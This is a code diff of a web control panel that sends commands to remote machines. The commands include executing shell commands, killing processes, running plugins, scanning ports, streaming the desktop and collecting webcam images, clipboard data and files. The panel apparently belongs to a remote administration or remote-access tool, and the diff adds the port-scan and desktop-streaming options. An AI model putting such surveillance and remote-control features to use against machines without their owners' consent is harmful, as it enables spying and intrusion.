@@ -27,6 +27,7 @@
             <label for="command">Command</label>
             <select id="command" class="form-control">
                 @*<option value="@Library.ECommand.DO_NOTHING">Do nothing</option>*@
+                <option value="@Library.ECommand.UPLOAD_PORTSCAN">Portscan</option>
                 <option value="@Library.ECommand.SYSCMD_SHUTDOWN">Shutdown</option>
                 <option value="@Library.ECommand.SYSCMD_RESTART">Restart</option>
                 <option value="@Library.ECommand.SYSCMD_LOGOFF">Logoff</option>
@@ -46,8 +47,8 @@
                 @*<option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>*@
                 <option value="@Library.ECommand.UPLOAD_FILE">Download a file</option>
                 <option value="@Library.ECommand.UPLOAD_FILE_EVENTS">Get file events</option>
-                @*<option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
-                    <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>*@
+                <option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
+                <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>
                 <option value="@Library.ECommand.EXECUTE_COMMAND">Execute a command</option>
                 <option value="@Library.ECommand.SET_TRANSMISSION_INTERVAL">Set transmission time</option>
                 <option value="@Library.ECommand.EXECUTE_PLUGIN">Execute Plugin</option>
@@ -193,6 +194,9 @@
         $.post('/api/RHS/SaveSettings', data, function (result) {
             console.log("result: " + result);
             switch (command) {
+                case '@Library.ECommand.UPLOAD_PORTSCAN':
+                    fileToOpen = "portscan.txt";
+                    break;
                 case '@Library.ECommand.UPLOAD_IMAGE':
                     //updateImage();
                     fileToOpen = "desktop.jpg";
@@ -201,10 +205,11 @@
                     fileToOpen = "webcam.jpg";
                     break;
                 case '@Library.ECommand.STREAM_DESKTOP':
-                    startStreamImage(parameters);
+                    //startStreamImage(parameters);
+                    //StartStreamDesktop();
                     break;
                 case '@Library.ECommand.STOP_STREAM_DESKTOP':
-                    stopStreamImage();
+                    //stopStreamImage();
                     break;
                 case '@Library.ECommand.UPLOAD_PORT_INFO':
                     //updatePortInfo();
@@ -218,9 +223,6 @@
                     break;
                 case '@Library.ECommand.UPLOAD_GATEWAYS':
                     fileToOpen = "gateways.txt";
-                    break;
-                case '@Library.ECommand.STREAM_DESKTOP':
-                    StartStreamDesktop();
                     break;
                 case '@Library.ECommand.EXECUTE_PLUGIN':
                     //updateData();
@@ -294,6 +296,11 @@
             $("#filename_div").show();
             $("#param_body").html('<input type="text" class="form-control" name="Parameters" id="Parameters" />');
             switch (command) {
+                case '@Library.ECommand.UPLOAD_PORTSCAN':
+                    $("#file_title").hide();
+                    $("#parameters_title").html("Port (e.g. 80, 80-1024);[IP Address] (optional, localhost is standard);[TCP or UDP] (optional, TCP is standard)");
+                    $("#filename_div").hide();
+                    break;
                 case '@Library.ECommand.UPLOAD_IMAGE':
                     $("#file_title").hide();
                     $("#parameters_title").html("Quality (1-100)");
@@ -310,6 +317,12 @@
                     break;
                 case '@Library.ECommand.KILL_PROCESS':
                     $("#parameters_title").html("Process Name or ID");
+                    $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.STREAM_DESKTOP':
+                    $("#file_title").hide();
+                    $("#parameters_div").show();
+                    $("#parameters_title").html("Interval (1000-10000ms);Quality (1-100pct)");
                     $("#filename_div").hide();
                     break;
                 case '@Library.ECommand.UPLOAD_CLIPBOARD_DATA':
@@ -330,6 +343,10 @@
                 case '@Library.ECommand.SET_TRANSMISSION_INTERVAL':
                     $("#parameters_title").html("Interval in ms");
                     $("#filename_div").hide();
+                    break;
+                case '@Library.ECommand.EXECUTE_COMMAND':
+                    $("#filename_div").show();
+                    $("#parameters_div").show();
                     break;
                 case '@Library.ECommand.EXECUTE_PLUGIN':
                     $("#file_title").html("Plugin filename");
